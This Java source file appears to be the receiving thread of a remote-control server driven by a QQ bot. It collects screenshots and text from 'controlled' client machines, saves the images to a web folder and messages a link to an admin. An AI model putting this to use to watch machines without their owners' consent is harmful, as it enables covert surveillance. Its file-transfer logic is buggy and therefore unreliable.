package com.example;

import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;

public class clientRecvThread implements Runnable
{
	clientInfo c;
	
	public clientRecvThread(clientInfo c1)
	{
		c = c1;
	}
	
	public void run()
	{
		Demo.CQ.logInfo("clentRecvThread", "进入接受信息子线程"+c.id);
		try {
			Demo.CQ.logInfo("clentRecvThread", "1");
			Thread.sleep(1000);
			InputStream read = c.s.getInputStream();
			Demo.CQ.logInfo("clentRecvThread", "2");
			int len = 0;
    		while(true)	//断开链接就退出循环
    		{
    			//Demo.CQ.sendPrivateMsg(Demo.adminQQ, "来自被控端[id:"+c.id+"]的消息:"+read.readLine());
    			Demo.CQ.logInfo("clentRecvThread", "进入循环");
    			try {
    				byte str[] = new byte[1024];
				    len = read.read(str);

				    if(len<0)
				    {
				    	Demo.CQ.logInfo("clentRecvThread", "退出接受循环");
				    	return ;
				    }
				    
				    
				    if(new String(str).toCharArray()[0] == '1' && new String(str).toCharArray()[1] == '1')
					{
				    	Demo.CQ.logInfo("clentRecvThread", new String(str));
				    	OutputStream fop = new FileOutputStream("C:\\wamp\\www\\img\\image.png");
				    	read.read(str);	//取得文件大小
				    	int fileLen = Integer.parseInt(new String(str).trim());
				    	int count = 0;
				    	Demo.CQ.logInfo("clentRecvThread", "通过"+fileLen);
						while((len = read.read(str)) != -1)
						{
							Demo.CQ.logInfo("clentRecvThread", "0");
							count = count + len;
							if(count >= fileLen)
							{
								Demo.CQ.logInfo("clentRecvThread", "2");
								break;
							}
							fop.write(str);
							fop.flush();
							Demo.CQ.logInfo("clentRecvThread", "1 count: " + count +"\nlen: "+ len);
						}
						
						Demo.CQ.logInfo("clentRecvThread", "循环结束"+new String(str,"UTF-8"));
						Demo.CQ.sendPrivateMsg(Demo.adminQQ, "截图: \n[ http://47.95.4.219/img/image.png ]");
						count = 0;
						len = 0;
						fileLen = 0;
						fop.close();
					}
				    
				    Demo.CQ.logInfo("clientRecvThread", "结束位置");
					Demo.CQ.sendPrivateMsg(Demo.adminQQ, new String(str,"GBK"));
				}catch(IOException e1)
    			{
					Demo.CQ.logInfo("clentRecvThread", "断开连接 异常");
					return ;
    			}catch(Exception e)
    			{
    				Demo.CQ.logInfo("clentRecvThread", e.toString());
    			}
    		}	
		} catch (UnsupportedEncodingException e) {
			// TODO 自动生成的 catch 块
			//e.printStackTrace();
			Demo.CQ.logInfo("clientRecvThread", e.toString());
		} catch (IOException e) {
			// TODO 自动生成的 catch 块
			//e.printStackTrace();
			Demo.CQ.logInfo("clientRecvThread", e.toString());
		} catch (InterruptedException e) {
			// TODO 自动生成的 catch 块
			e.printStackTrace();
		}
	    
	}
}